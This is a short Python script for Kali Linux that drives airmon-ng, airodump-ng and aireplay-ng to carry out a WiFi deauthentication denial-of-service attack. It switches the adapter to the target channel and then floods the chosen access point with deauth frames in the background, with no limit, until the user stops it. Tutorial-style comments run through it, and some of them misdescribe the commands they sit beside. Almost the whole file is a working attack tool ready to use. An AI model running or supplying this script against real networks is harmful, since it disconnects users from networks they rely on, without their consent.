
import os
# We require regular expressions.
import re
# We will be using the subprocess module to run commands on Kali Linux.
import subprocess
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

# hackchannel hackbssid -data we need from the active_wireless_networks
#hackbssid = active_wireless_networks[int(choice)]["BSSID"]
#hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
def deautentication_user( hacknic , hackbssid ,hackchannel):

    # Kill conflicting WiFi processses
    print("WiFi adapter connected!\nNow let's kill conflicting processes:")

    # subprocess.run(<list of command line arguments goes here>)
    # The script is the parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
    # We run the iwconfig command to look for wireless interfaces.
    # Killing all conflicting processes using airmon-ng
    kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])


    # subprocess.Popen(<list of command line arguments goes here>)
    # The Popen method opens a pipe from a command. The output is an open file that can be accessed by other programs.
    # We run the iwconfig command to look for wireless interfaces.
    # Discover access points
    discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


    # Change to the channel we want to perform the DOS attack on.
    # Monitoring takes place on a different channel and we need to set it to that channel.
    subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

    # Deauthenticate clients. We run it with Popen and we send the output to subprocess.DEVNULL and the errors to subprocess.DEVNULL. We will thus run deauthenticate in the background.
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # We run an infinite loop which you can quit by presses ctrl-c. The deauthentication will stop when we stop the script.
    try:
        while True:
            print("Deauthenticating clients, press ctrl-c to stop")
    except KeyboardInterrupt:
        print("Stop monitoring mode")
        # We run a subprocess.run command where we stop monitoring mode on the network adapter.
        subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
        print("Thank you! Exiting now")